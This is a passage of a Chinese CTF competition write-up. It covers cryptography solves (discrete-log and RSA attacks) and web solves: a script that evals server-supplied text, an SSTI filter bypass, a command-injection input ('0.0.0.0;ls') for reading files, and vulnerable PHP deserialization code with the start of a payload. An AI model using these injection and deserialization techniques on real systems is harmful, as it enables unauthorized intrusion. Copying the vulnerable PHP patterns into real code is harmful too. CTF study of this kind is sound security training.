<span class="c1">############################################################### attack</span>
<span class="n">E</span> <span class="o">=</span> <span class="n">A</span><span class="o">*</span><span class="n">T</span><span class="o">*</span><span class="n">A</span>
<span class="n">detA</span><span class="p">,</span> <span class="n">detT</span><span class="p">,</span> <span class="n">detS</span><span class="p">,</span> <span class="n">detG</span><span class="p">,</span> <span class="n">detE</span><span class="p">,</span> <span class="n">detF</span> <span class="o">=</span> <span class="n">A</span><span class="o">.</span><span class="n">det</span><span class="p">(),</span> <span class="n">T</span><span class="o">.</span><span class="n">det</span><span class="p">(),</span> <span class="n">S</span><span class="o">.</span><span class="n">det</span><span class="p">(),</span> <span class="n">G</span><span class="o">.</span><span class="n">det</span><span class="p">(),</span> <span class="n">E</span><span class="o">.</span><span class="n">det</span><span class="p">(),</span> <span class="n">F</span><span class="o">.</span><span class="n">det</span><span class="p">()</span>
<span class="n">r</span> <span class="o">=</span> <span class="mi">2244966557637008779362441591080406338119704738381872153797151</span>
<span class="c1">#R = 80839783875482453208291688688697485912290384775841712705111124172946909733768714734343762988749579725275997021760357500939</span>
<span class="c1">#r = discrete_log(detG^R, ((detA^(-1)*detT).sqrt())^R, ord=(p^2-1)//R)</span>
<span class="c1">#s = discrete_log(((detA^(-2)*detT^(-1)*detF).sqrt())^R, detG^R, ord=(p^2-1)//R)</span>
<span class="c1">#not enough so use cado-nfs</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="n">command</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">'./cado-nfs.py'</span><span class="p">,</span>
    <span class="s1">'-dlp'</span><span class="p">,</span>
    <span class="s1">'-ell'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">),</span>
    <span class="s1">'target='</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">t1</span><span class="p">),</span>
    <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="p">]</span>
<span class="c1">#1541758195020130454925136833461872657607368759409055632195831</span>

<span class="n">command</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">'./cado-nfs.py'</span><span class="p">,</span>
    <span class="s1">'-dlp'</span><span class="p">,</span>
    <span class="s1">'-ell'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">),</span>
    <span class="s1">'target='</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">t2</span><span class="p">),</span>
    <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="p">]</span>
<span class="c1">#780392429787953543532147509264510635118839088869098098140941</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">check</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
<span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"ERROR: {e.returncode}"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"ERROR:"</span><span class="p">,</span> <span class="n">e</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
<span class="c1">#t2^s = t1</span>
<span class="n">Fr</span> <span class="o">=</span> <span class="n">GF</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
<span class="n">s1</span> <span class="o">=</span> <span class="n">Fr</span><span class="p">(</span><span class="mi">1541758195020130454925136833461872657607368759409055632195831</span><span class="p">)</span>
<span class="n">s2</span> <span class="o">=</span> <span class="n">Fr</span><span class="p">(</span><span class="mi">780392429787953543532147509264510635118839088869098098140941</span><span class="p">)</span>
<span class="n">ss</span> <span class="o">=</span> <span class="n">discrete_log</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">t1</span><span class="p">,</span> <span class="mi">6</span><span class="o">*</span><span class="n">r</span><span class="p">,</span> <span class="n">p</span><span class="p">),</span> <span class="nb">pow</span><span class="p">(</span><span class="n">t2</span><span class="p">,</span> <span class="mi">6</span><span class="o">*</span><span class="n">r</span><span class="p">,</span> <span class="n">p</span><span class="p">),</span> <span class="n">operation</span><span class="o">=</span><span class="s2">"*"</span><span class="p">,</span> <span class="nb">ord</span><span class="o">=</span><span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="n">r</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">crt</span><span class="p">([</span><span class="nb">int</span><span class="p">(</span><span class="n">ss</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">s1</span><span class="o">/</span><span class="n">s2</span><span class="p">)],</span> <span class="p">[(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="p">(</span><span class="mi">6</span><span class="o">*</span><span class="n">r</span><span class="p">),</span> <span class="n">r</span><span class="p">])</span>

<span class="n">ss</span> <span class="o">=</span> <span class="n">s</span>
<span class="k">for</span> <span class="n">ii</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">ss</span> <span class="o">+</span> <span class="n">ii</span> <span class="o">*</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">6</span>
    <span class="n">D</span> <span class="o">=</span> <span class="n">G</span><span class="o">^</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="n">K</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">D</span><span class="o">*</span><span class="n">S</span><span class="o">*</span><span class="n">D</span><span class="p">)</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">K</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">+</span><span class="nb">sum</span><span class="p">(</span><span class="n">K</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">+</span><span class="nb">sum</span><span class="p">(</span><span class="n">K</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">mask</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
    <span class="n">pt</span> <span class="o">=</span> <span class="n">ct</span> <span class="o">^^</span> <span class="n">mask</span>
    <span class="k">if</span><span class="p">(</span><span class="n">D</span><span class="o">.</span><span class="n">det</span><span class="p">()</span><span class="o">*</span><span class="n">detE</span><span class="o">*</span><span class="n">D</span><span class="o">.</span><span class="n">det</span><span class="p">()</span> <span class="o">==</span> <span class="n">detF</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">pt</span><span class="p">))</span>
        <span class="k">break</span>


<span class="c1">#QAQ~4_Br0ken_Crypto_Sy5tem~TAT</span>
<span class="n">QAQ</span><span class="o">~</span><span class="mi">4</span><span class="n">_Br0ken_Crypto_Sy5tem</span><span class="o">~</span><span class="n">TAT</span>
</pre></div>
<h3 data-content="1" id="4c4c169e77288017513813a54b4a4399">easyCrypto</h3>
<pre><code>https://blog.csdn.net/luochen2436/article/details/132964576</code></pre>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">gmpy2</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">n</span> <span class="o">=</span> <span class="mi">135133139540786818977969958456509467902948924003478556140490841984247464940261764739984274397650928404945721248284577232814352745333641188749824519153271662051302477973525156608141358709265683759057060630360909926255299541198485901065352661702656282587105799982740927802530997159098015074633017964344230291287</span>
<span class="n">c</span> <span class="o">=</span> <span class="mi">1836794759996264077871820946090708779709415760553736759453665641907562256633157424959089180650539327925671892742819931875681606982615287882656254828326465758462357812873839261469783652663796071814218493268788421243190729887313099383264588659922912876424206670310928514588754069909128149471326084547056385690037197908766053620702238356084124023146075698878494434053246157524775269473152458661801907641122308756667762880284617915774590075511686821816948174618196839335059944389423693187930672934293905608970421003536691336581450927887931599275461176935079227494931457562345640133982771901848553204154760760399724074615092290799119053032875792219794072963200108352944441876206386518960615891547166767499506114294860833404421893612197040731184031783165365621722947731966143226777081983415797778111715332055871302609049501876860012070502369090417942239749695034267695710324328867728296996779</span>
<span class="n">p</span> <span class="o">=</span> <span class="mi">13352463043552409670211183534740157814546713901105410408023687926498813469217507846107364405269402732967687839808637375591530105677153038557366731161035343</span>
<span class="n">q</span> <span class="o">=</span> <span class="n">n</span><span class="o">//</span><span class="n">p</span>
<span class="n">P</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="n">q</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">130</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">c</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="n">n</span><span class="o">*</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">P</span><span class="p">,</span><span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="n">n</span>
<span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</pre></div>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776218659-41cfee20-2479-42d5-9d06-2ff014307077.png"/></p>
<p>DASCTF{365d0d2cda3a3836a19bf1f46760d875}</p>
<h3 data-content="1" id="09a3042c63a0679496d1673f19930b6e">Mypow</h3>
<pre><code>https://blog.csdn.net/luochen2436/article/details/132138412</code></pre>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">gmpy2</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span>  <span class="o">*</span>

<span class="n">n</span> <span class="o">=</span> <span class="mi">36443283250594259606482132779262570582448178589602577809591307671554949253094255209079689901493052116793388954529442162972106210862341856282788030374324677114528044629385805693771773377070021111949953333360526159026822968061585876873187059674130307295006486032106471182393880915860569773206853864515489855553</span>
<span class="n">hint</span> <span class="o">=</span> <span class="mi">57792516722001523643789088224096258172899052039145876393373730235406451592173971020702024058282699663364267742428240581839287357212741266617791207580236457</span>
<span class="n">ct</span> <span class="o">=</span> <span class="mi">24482128269957355675512496312977308128712253968496848873519792376434347925427116612997489113223781321628516365811583310346553402215907938918891908853234881284620764982626375301219763593402089309909155204943747718536894186749932544428588048770663458669109073657836937287831725958017345747881678942488157429000</span>

<span class="n">R</span><span class="o">.&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">Zmod</span><span class="p">()[]</span>
<span class="n">f</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">7</span><span class="o">*</span><span class="n">n</span> <span class="o">-</span> <span class="n">hint</span><span class="o">*</span><span class="n">x</span>
<span class="n">p</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">roots</span><span class="p">()[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span>
<span class="n">q</span> <span class="o">=</span> <span class="n">n</span><span class="o">//</span><span class="n">p</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">next_prime</span><span class="p">(</span><span class="mi">666</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span>

<span class="n">R</span><span class="o">.&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">Zmod</span><span class="p">(</span><span class="n">p</span><span class="p">)[]</span>
<span class="n">f</span> <span class="o">=</span> <span class="n">x</span><span class="o">^</span><span class="n">e</span><span class="o">-</span><span class="n">ct</span>
<span class="n">f</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">monic</span><span class="p">()</span>
<span class="n">results1</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">roots</span><span class="p">()</span>

<span class="n">R</span><span class="o">.&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">Zmod</span><span class="p">(</span><span class="n">q</span><span class="p">)[]</span>
<span class="n">f</span> <span class="o">=</span> <span class="n">x</span><span class="o">^</span><span class="n">e</span><span class="o">-</span><span class="n">ct</span>
<span class="n">f</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">monic</span><span class="p">()</span>
<span class="n">results2</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">roots</span><span class="p">()</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">results1</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">results2</span><span class="p">:</span>
        <span class="n">param1</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span><span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="p">[</span><span class="mi">0</span><span class="p">])]</span>
        <span class="n">param2</span> <span class="o">=</span> <span class="p">[</span><span class="n">p</span><span class="p">,</span><span class="n">q</span><span class="p">]</span>
        <span class="n">m</span> <span class="o">=</span> <span class="n">CRT_list</span><span class="p">(</span><span class="n">param1</span><span class="p">,</span><span class="n">param2</span><span class="p">)</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s1">'DASCTF'</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
            <span class="k">break</span>
</pre></div>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776218821-a9ca5cef-b972-4935-95cf-aa5bf9db8b3e.png"/></p>
<p>DASCTF{FastP0w3r_4nd_AMM_0f_R5A}</p>
<h2 data-content="1" id="ffd61529fe959193a56cb7d78b35cd75">web</h2>
<h3 data-content="1" id="a990e6989a03dfc43fefefb3ef8b3260">速算比赛</h3>
<pre><code>https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA</code></pre>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span><span class="nn">re</span>
<span class="n">sessions</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">31</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s1">'http://139.155.126.78:18257/'</span>
    <span class="n">html</span> <span class="o">=</span> <span class="n">sessions</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">Calculate</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">"Calculate: (.*?)&lt;br&gt;"</span><span class="p">,</span><span class="n">html</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">Correct_Count</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">"Correct Count: (.*?)&lt;br&gt;"</span><span class="p">,</span><span class="n">html</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">answer</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">Calculate</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"提交答案：{answer}"</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">'http://139.155.126.78:18257/'</span>
        <span class="n">html</span> <span class="o">=</span> <span class="n">sessions</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"answer"</span><span class="p">:</span><span class="n">answer</span><span class="p">})</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">html</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</pre></div>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776219041-0989aa04-f28a-48a5-a001-2e13dab958c5.png"/></p>
<p>DASCTF{335254ed-c7fc-4be4-b2f2-7c83616b0247}</p>
<h3 data-content="1" id="a29f003c5cfafcf44d6a19ebd40b3c74">Sal的图集</h3>
<pre><code>https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA</code></pre>
<p>search存在ssti</p>
<p>使用fenjing一把梭</p>
<p>import , builtins，cat被过滤</p>
<p>用'' 即可绕过</p>
<p>读取flag</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776219272-df5686a1-6e27-4188-bca9-a4d90020d3ea.png"/></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776219622-6214e35f-8fd6-4dcf-8d3d-50353d7b2b89.png"/></p>
<p>DASCTF{a82d4d9ff4b5c4651f0ac8e6af134e4b}</p>
<h3 data-content="1" id="37b1fd28139c074faad3ce3bf94b9dee">popmart</h3>
<pre><code>https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA</code></pre>
<p>0.0.0.0;ls</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776219813-085e9e9a-a6e9-42c4-b77f-9e4dd26afeda.png"/></p>
<p>可以进行rce</p>
<p>但是这里对长度有限制</p>
<p>使用nl 命令查看当前目录下所有文件的内容</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776219985-370defeb-2a7e-4a48-a28f-dbd375687bdb.png"/></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776220225-7efdb321-93d7-4eee-aaca-7e1695f8079e.png"/><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776220540-9422ae7a-734a-4390-8629-ad5c25dc9d6c.png"/></p>
<p>p0pmart.php存在反序列化</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
  <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">require_once</span><span class="p">(</span><span class="s2">"flag.php"</span><span class="p">);</span>
<span class="k">class</span> <span class="nc">popmart</span> <span class="p">{</span>
  <span class="k">public</span> <span class="nv">$yuki</span><span class="p">;</span>
  <span class="k">public</span> <span class="nv">$molly</span><span class="p">;</span>
  <span class="k">public</span> <span class="nv">$dimoo</span><span class="p">;</span>
  <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">yuki</span> <span class="o">=</span> <span class="s1">'tell me where'</span><span class="p">;</span>
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">molly</span> <span class="o">=</span> <span class="s1">'dont_tell_you'</span><span class="p">;</span>
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dimoo</span> <span class="o">=</span> <span class="s2">"you_can_guess"</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
    <span class="k">global</span> <span class="nv">$where_you_go</span><span class="p">;</span>
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">yuki</span> <span class="o">=</span> <span class="nv">$where_you_go</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">molly</span> <span class="o">===</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">yuki</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$pucky</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'wq'</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$pucky</span><span class="p">))</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$pucky</span> <span class="o">===</span> <span class="s2">"二仙桥"</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$pucky</span> <span class="o">===</span> <span class="s2">"二仙桥"</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">die</span><span class="p">(</span><span class="s2">"&lt;script&gt;window.alert('说说看，你要去哪？？');&lt;/script&gt;"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$pucky</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
  <span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>tcClassLoad.php</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">include</span> <span class="s2">"auth.php"</span><span class="p">;</span>

<span class="k">class</span> <span class="nc">Als</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$text</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$dict</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span> <span class="o">==</span> <span class="s2">"helloworld"</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dict</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span><span class="o">-&gt;</span><span class="na">undefinedProperty</span> <span class="o">=</span> <span class="s1">'New Value'</span><span class="p">;</span>
        <span class="k">return</span> <span class="s2">"HACKER"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Kl</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$apple</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$phone</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$var</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arguments</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">apple</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$$key</span> <span class="o">=</span> <span class="nv">$$value</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span> <span class="o">==</span> <span class="s2">"Hack"</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$arr</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$arr</span><span class="p">[]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">die</span><span class="p">(</span><span class="s2">"Hack!!"</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">phone</span><span class="p">);</span>
                    <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Glb</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$boy</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$gay</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$cc</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">init</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">boy</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">gay</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">boy</span><span class="p">))</span> <span class="p">{</span>
            <span class="nb">print_r</span><span class="p">(</span><span class="s2">"1314"</span><span class="p">);</span>
            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">boy</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$serializecmd</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
    <span class="nv">$unserializecmd</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$serializecmd</span><span class="p">);</span>
    <span class="nv">$unserializecmd</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">();</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776220821-0dfa23e9-363c-4abd-b809-1e6392da313d.png"/></p>
<p>我们进行构造</p>
<p>这里检查wq要传入 "二仙桥"</p>
<p>利用extract这个函数进行变量覆盖</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">popmart</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$yuki</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$molly</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$dimoo</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">yuki</span> <span class="o">=</span> <span class="s1">'tell me where'</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">molly</span> <span class="o">=</span> <span class="s1">'dont_tell_you'</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dimoo</span> <span class="o">=</span> <span class="s2">"you_can_guess"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">popmart</span><span class="p">());</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x"># O:7:"popmart":3:{s:4:"yuki";s:13:"tell me</span>
